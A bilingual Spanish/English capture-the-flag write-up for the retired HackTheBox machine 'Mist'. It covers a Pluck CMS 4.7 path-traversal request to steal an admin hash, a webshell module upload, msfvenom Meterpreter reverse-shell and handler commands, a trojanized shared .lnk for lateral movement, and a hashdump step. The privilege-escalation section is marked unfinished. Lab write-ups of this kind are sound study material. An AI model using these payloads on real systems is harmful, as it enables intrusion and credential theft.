# Mist [Medium]

> **ES:** Máquina Windows (AD `mist.htb`, host MS01) con Pluck CMS 4.7 en XAMPP; LFI para robar hash de admin, upload de módulo → Meterpreter y movimiento lateral con `.lnk` troyanizado.
> **EN:** Windows box (AD `mist.htb`, host MS01) with Pluck CMS 4.7 on XAMPP; LFI to steal the admin hash, module upload → Meterpreter, and lateral move with a trojanized `.lnk`.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Medium |
| **OS** | Windows |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Mist] |
| **URL** | https://app.hackthebox.com/machines/Mist |
| **IP lab** | 10.10.11.17 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: Mist (video)](https://youtube.com/watch?v=5osU3Igzv_Y) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía Pluck CMS (LFI + upload) y progresión en dominio Windows (nota local parcial: llega hasta `MIST\Brandon.Keywarp`).
> **EN:** Get `user.txt` and `root.txt` via Pluck CMS (LFI + upload) and Windows domain progression (local notes partial: up to `MIST\Brandon.Keywarp`).

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] dirsearch (robots `/data/ /docs/`, `login.php`, `admin.php`)
- [ ] crackstation (hash SHA512 del backup)
- [ ] msfvenom + msfconsole (handler Meterpreter x64)
- [ ] PowerShell (crear `.lnk` en `C:\Common Applications`)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Solo 80 abierto (Apache 2.4.52 Win64 + PHP 8.1.1, generador Pluck 4.7.18). URL con `?file=mist`.
> **EN:** Only 80 open (Apache 2.4.52 Win64 + PHP 8.1.1, Pluck 4.7.18 generator). URL uses `?file=mist`.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.17
curl -s http://10.10.11.17/robots.txt
```

**Resultado / Result:** Pluck CMS; `robots` bloquea `/data/ /docs/`. Capturas en `img/` original.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** LFI conocido de Pluck 4.7 para leer `data/settings/` y backups; se extrae un hash SHA512 de admin y se crackea offline.
> **EN:** Known Pluck 4.7 LFI to read `data/settings/` and backups; an admin SHA512 hash is extracted and cracked offline.

```bash
# Concepto (parafraseado): pedir al endpoint vulnerable una ruta con traversal
# hacia el fichero de backup y crackear el hash resultante
curl -s 'http://10.10.11.17/<endpoint-vulnerable>?file=....//....//data/settings/passwd'
```

**Resultado / Result:** Contraseña de admin recuperada (no reproducida aquí).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Login en `login.php/admin.php`, instalar módulo ZIP malicioso (p0wny-shell empaquetado) y descargar/ejecutar payload `msfvenom` antes de que el limpiador lo borre → Meterpreter como `svc_web`.
> **EN:** Log in at `login.php/admin.php`, install a malicious ZIP module (packed p0wny-shell) and download/execute an `msfvenom` payload before the cleaner deletes it → Meterpreter as `svc_web`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=TU-IP LPORT=9999 -f exe -o payload.exe
python3 -m http.server 8080
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST TU-IP; set LPORT 9999; run"
# En la webshell (concepto): descargar el exe y ejecutarlo
```

**Resultado / Result:** Sesión Meterpreter en MS01 (dominio MIST).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Enum con PEASS; carpeta `C:\Common Applications` con `.lnk` que otros usuarios abren → troyanizar `Notepad.lnk` para que apunte a un segundo payload y esperar ejecución → sesión como `MIST\Brandon.Keywarp`. Las notas locales quedan en `TODO` tras este punto.
> **EN:** Enum with PEASS; `C:\Common Applications` holds `.lnk` files other users open → trojanize `Notepad.lnk` to point at a second payload and wait → session as `MIST\Brandon.Keywarp`. Local notes end in `TODO` after this point.

```bash
# En Meterpreter/PowerShell (concepto parafraseado):
# crear acceso directo cuyo TargetPath sea el segundo payload y guardarlo
# sobre C:\Common Applications\Notepad.lnk; escuchar en 8888
sysinfo; getuid
```

**Resultado / Result:** Acceso como usuario de dominio adicional; resto de la cadena AD pendiente de completar en laboratorio.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** Pendiente en notas locales (AD: MS01 + DC01). Vía probable: recolección de credenciales/kerberos desde el contexto de dominio hasta Administrador/DC.
> **EN:** Pending in local notes (AD: MS01 + DC01). Likely path: credential harvesting / Kerberos abuse from the domain context up to Administrator/DC.

```bash
sysinfo
hashdump  # solo en lab retirado y con sesión SYSTEM/DA
cat 'C:\Users\Administrator\Desktop\root.txt'  # solo en lab retirado
```

**Resultado / Result:** [Cadena completa pendiente — nota local marcada TODO; completar en lab].

---

## 🧠 Lo aprendido / Learned

> **ES:** LFI en Pluck 4.7 para robo de credenciales; upload de módulos como webshell; uploads efímeros (race contra limpiador); lateral vía `.lnk` en carpetas compartidas en AD.
> **EN:** Pluck 4.7 LFI for credential theft; module upload as webshell; ephemeral uploads (race vs. cleaner); lateral via `.lnk` in shared folders on AD.

- [ ] Crack offline de hash SHA512
- [ ] Handler Meterpreter x64 + `upload/exec`
- [ ] Abuso de accesos directos (`WScript.Shell`) para lateral

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Notas locales `index.md` + capturas en `img/` (contenido propio previo, sin normalizar; cadena marcada TODO)
- **Walkthrough de referencia:** [verificar en app.hackthebox.com/machines/Mist]
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Nota original en chino/inglés migrada al molde bilingüe ES/EN; flags ofuscadas, pasos parafraseados; privesc final pendiente de documentar.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
